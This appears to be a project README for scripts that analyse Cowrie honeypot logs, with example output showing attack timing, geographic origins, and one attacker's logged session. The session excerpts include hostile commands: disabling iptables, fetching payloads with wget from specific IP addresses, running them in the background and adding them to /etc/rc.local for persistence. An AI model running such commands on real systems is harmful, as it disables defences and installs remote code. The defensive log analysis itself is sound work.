# Honeypot Log Analysis

- [Setup](#setup)
- [10 Questions](#10-questions)
  * [Run](#run)
- [Depth Analysis](#depth-analysis)
  * [Run](#run-1)
  * [Example Output](#example-output)
- [Breadth Analysis](#breadth-analysis)
  * [Run](#run-2)
  * [EXAMPLE OUTPUT](#example-output)
- [Reference](#reference)

## Setup
Install required modules for the project

```bash
python3 -m pip install -r requirements.txt
```

Copy the log file `honey.log` to the project directory

## 10 Questions
Script [here](analysis.py)

### Run

```bash
python analysis.py
```

## Depth Analysis
Script [here](depthanalysis.py)

Set the IP to be analyzed and the number of sessions to be displayed

```python
TARGET_IP = '139.219.8.223'
NUM_OF_SESSION_TO_DISPLAY = 2
```

### Run

```bash
python depthanalysis.py

```

### Example Output
```bash
IP to be analyzed:  139.219.8.223
number of sessions made: 8
number of sessions by weekday:
Sat 7
Thu 1

SESSIONS WITH THE MOST INTERACTION
 ----------------------------------------------------------------------------------------------------
session ID:  99347df7eb4f
line number in the log that the session starts:  54468
login username:  root
login password:  password

DETAILS
 ----------------------------------------------------------------------------------------------------
Time                       	Event ID                         	Command

...

2020-03-28T12:23:06.129752Z	cowrie.command.input             	service iptables stop
2020-03-28T12:23:10.109464Z	cowrie.command.input             	wget http://139.219.2.19:18211/25000
2020-03-28T12:23:10.564622Z	cowrie.session.file_download.failed	
2020-03-28T12:23:14.106263Z	cowrie.command.input             	chmod 0777 /root/25000
2020-03-28T12:23:18.109980Z	cowrie.command.input             	nohup /root/25000 > /dev/null 2>&1 &
2020-03-28T12:23:22.105162Z	cowrie.command.input             	chmod 777 25000
2020-03-28T12:23:26.106369Z	cowrie.command.input             	./25000
2020-03-28T12:23:26.106905Z	cowrie.command.failed            	./25000

...

2020-03-28T12:26:02.113010Z	cowrie.command.input             	echo "./25000&">>/etc/rc.local

...
```

For this example, the attacker usually attack on Saturday of the system timezone. 

In this example with session ID 99347df7eb4f, the attacker logged in as the root user. The first thing it does, it's to try to stop the firewall of the system

```bash
service iptables stop
```

Then, it goes to download a file called `25000` (a bash script actually) from a remote server. Then it tries to run it in the background.

Finally, the attacker appends the command to execute the script to `rc.local` so that the script will be executed every time the system restart.

```bash
echo "./25000&">>/etc/rc.local
```

In another session, the attacker logged in again as the root user with the same credential. However, this time it downloads a new script called `glt` and then tries to execute it. At the end, it also appends the command to execute this script to the system startup script.

```bash
2020-03-26T17:54:53.964571Z	cowrie.command.input             	wget http://139.219.8.223:12593/glt
```

The attacker downloads yet another script called `SUK`

```bash
2020-03-28T14:03:27.107501Z	cowrie.command.input             	wget http://139.219.8.223:12593/SUK
```


## Breadth Analysis
Script [here](breadthanalysis.py)

Set the number of countries, regions, and hours to be displayed

```python
NUM_OF_COUNTRY_TO_DISPLAY = 3
NUM_OF_REGION_TO_DISPLAY = 5
NUM_OF_HOUR_TO_DISPLAY = 8
```

### Run

```bash
python breadthanalysis.py
```

### EXAMPLE OUTPUT

```
TOTAL ATTACKS:  6304


COUNTRY                  	ATTACKS   	PERCENTAGE %
China                    	2064      	32.74       
France                   	624       	9.90        
United States            	607       	9.63        


CHINA
----------------------------------------------------------------------------------------------------
REGION                   	ATTACKS   	PERCENTAGE %
Beijing                  	1342      	65.02       
Guangdong                	161       	7.80        
Shanghai                 	97        	4.70        
Jiangsu                  	91        	4.41        
Zhejiang                 	63        	3.05        

HOUR                     	ATTACKS   	PERCENTAGE %
00                       	122       	5.91        
18                       	113       	5.47        
19                       	111       	5.38        
21                       	108       	5.23        
01                       	103       	4.99        
17                       	100       	4.84        
04                       	98        	4.75        
11                       	98        	4.75     

...

FRANCE
----------------------------------------------------------------------------------------------------    

HOUR                     	ATTACKS   	PERCENTAGE %
17                       	153       	24.52       
18                       	106       	16.99       

```

For this example, the top 3 most active countries that attacks originate are listed. Most of the attacks come from `China`, which accounts for **32.74%** of the overall attack load.

In a more detailed breakdown, most attacks originate from `Beijing`, which accounts for **65.02%** of the overall attack load within the country. Besides, the attacks are spreadout throughout the day, as there is relatively the same amount of attack load for each hour that orginates from the country.

For the next country in the list, `France`, however, most attacks are carried out between **17 - 18** of the day of the timezone of the system.

## Reference

- [Ipstack](https://ipstack.com) is used for geo information lookup by IP